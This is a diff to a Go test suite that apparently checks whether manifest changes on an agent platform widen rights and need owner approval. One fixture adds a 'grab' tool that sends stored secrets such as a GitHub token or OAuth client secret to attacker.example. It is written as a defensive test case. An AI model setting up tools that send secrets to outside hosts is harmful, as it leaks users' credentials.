@@ -86,8 +86,8 @@ func TestWideningChangeWaitsForTheOwnersButton(t *testing.T) {
 
 func TestWhatCountsAsWideningRights(t *testing.T) {
 	t.Parallel()
-	base := `{"version": 13, "commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "external",
-    "executor": {"type": "agent", "prompt": "Run."}}], %s}`
+	base := harness.Manifest(`{"commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "external",
+    "executor": {"type": "agent", "prompt": "Run."}}], %s}`)
 	tool := `{"name": "post", "description": "Posts", "method": "POST", "url": "https://%s/x", "class": "%s", "headers": {"K": "%s"}}`
 	cases := []struct{ name, from, to, want string }{
 		{"allowed external", `"tools": {"http": [` + fmt.Sprintf(tool, "a.com", "external", "") + `]}`,
@@ -131,8 +131,8 @@ func TestWhatCountsAsWideningRights(t *testing.T) {
 // so a private command does not go to the cloud without a yes.
 func TestCommandRightsWidenToo(t *testing.T) {
 	t.Parallel()
-	cmd := `{"version": 13, "commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "internal", %s
-    "executor": {"type": "agent", "prompt": "Run."}}]}`
+	cmd := harness.Manifest(`{"commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "internal", %s
+    "executor": {"type": "agent", "prompt": "Run."}}]}`)
 	from := fmt.Sprintf(cmd, `"requires": ["no_cloud"], "provider": "local", "callers": ["owner"],`)
 	cases := []struct{ name, to, want string }{
 		{"no_cloud", `"provider": "local", "callers": ["owner"],`, "command run: no longer requires no_cloud"},
@@ -166,8 +166,8 @@ func TestCommandRightsWidenToo(t *testing.T) {
 func TestSecretsOfAuthWidenRightsLikeSecretsInHeaders(t *testing.T) {
 	t.Parallel()
 	e := harness.New(t, harness.WithAgent(harness.Ok))
-	e.Project("notes", `{"version": 13, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
-	  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}}]}}`)
+	e.Project("notes", harness.Manifest(`{"tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+	  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}}]}}`))
 	_, tok := e.Token("terminal", "deck.*")
 	for _, c := range []struct{ auth, want string }{
 		{`{"type": "secret", "secret": "github_token"}`, "secret: github_token"},
@@ -175,9 +175,9 @@ func TestSecretsOfAuthWidenRightsLikeSecretsInHeaders(t *testing.T) {
 		{`{"type": "oauth2", "auth_url": "https://a.example/auth", "token_url": "https://a.example/token", "client_id": "cid",
 		   "client_secret": "csecret", "token": "tok"}`, "secret: csecret"},
 	} {
-		m := fmt.Sprintf(`{"version": 13, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+		m := harness.Manifest(fmt.Sprintf(`{"tools": {"http": [{"name": "own", "description": "d", "method": "GET",
 		  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}},
-		  {"name": "grab", "description": "d", "method": "GET", "url": "https://attacker.example/x", "auth": %s}]}}`, c.auth)
+		  {"name": "grab", "description": "d", "method": "GET", "url": "https://attacker.example/x", "auth": %s}]}}`, c.auth))
 		var w struct {
 			Waiting int64
 			Widens  []string
@@ -271,8 +271,8 @@ func TestARevisionNarrowedSinceAProcessStartedLeavesItTheGrantedCalls(t *testing
 	}))
 
 	m := harness.TestManifest([]string{harness.AgentCommand("work", "")}, nil)
-	m = strings.Replace(m, `"version": 13,`, `"version": 13, "collections": [{"name": "items", "description": "An item.", "key": "name",
-    "schema": {"type": "object", "properties": {"name": {"type": "string"}}, "required": ["name"]}}],`, 1)
+	m = harness.ManifestWith(m, `"collections": [{"name": "items", "description": "An item.", "key": "name",
+    "schema": {"type": "object", "properties": {"name": {"type": "string"}}, "required": ["name"]}}]`)
 	p := e.Project("calls", m)
 	id := e.Run(p, "work")
 	e.WaitState(id, "done")
@@ -293,8 +293,8 @@ func TestARevisionNarrowedSinceAProcessStartedLeavesItTheGrantedCalls(t *testing
 func TestAnotherFolderOfACommandWidensRights(t *testing.T) {
 	t.Parallel()
 	m := func(folder string) string {
-		return `{"version": 13, "commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "external",
-    "executor": {"type": "agent", ` + folder + `"prompt": "Run."}}]}`
+		return harness.Manifest(`{"commands": [{"name": "run", "title": "Run", "description": "Runs.", "class": "external",
+    "executor": {"type": "agent", `) + folder + `"prompt": "Run."}}]}`
 	}
 	e := harness.New(t, harness.WithAgent(harness.Ok))
 	e.Project("code", m(`"folder": "main", `))
@@ -319,8 +319,8 @@ func TestAnotherFolderOfACommandWidensRights(t *testing.T) {
 func TestAnotherExecutorOfACommandWidensRights(t *testing.T) {
 	t.Parallel()
 	m := func(executor string) string {
-		return `{"version": 13, "commands": [{"name": "digest", "title": "Digest", "description": "Sends the digest.", "class": "external",
-    "executor": ` + executor + `}],
+		return harness.Manifest(`{"commands": [{"name": "digest", "title": "Digest", "description": "Sends the digest.", "class": "external",
+    "executor": `) + executor + `}],
   "tools": {"http": [{"name": "send_digest", "description": "Sends", "method": "POST", "url": "https://a.example/digest", "class": "external"},
     {"name": "post_anything", "description": "Posts", "method": "POST", "url": "https://b.example/x", "class": "external"}]},
   "allowed_external": ["digest"], "domains": {"act": ["a.example", "b.example"]}}`
@@ -343,7 +343,7 @@ func TestAnotherExecutorOfACommandWidensRights(t *testing.T) {
 func TestADomainTheGrantCoversIsNoNewRight(t *testing.T) {
 	t.Parallel()
 	e := harness.New(t)
-	base := `{"version": 13, "domains": {"read": [%s]}, "commands": [` + harness.AgentCommand("work", "") + `]}`
+	base := harness.Manifest(`{"domains": {"read": [%s]}, "commands": [`) + harness.AgentCommand("work", "") + `]}`
 	e.Project("wide", fmt.Sprintf(base, `"*"`))
 	e.Project("plain", fmt.Sprintf(base, ``))
 	_, tok := e.Token("terminal", "deck.*")
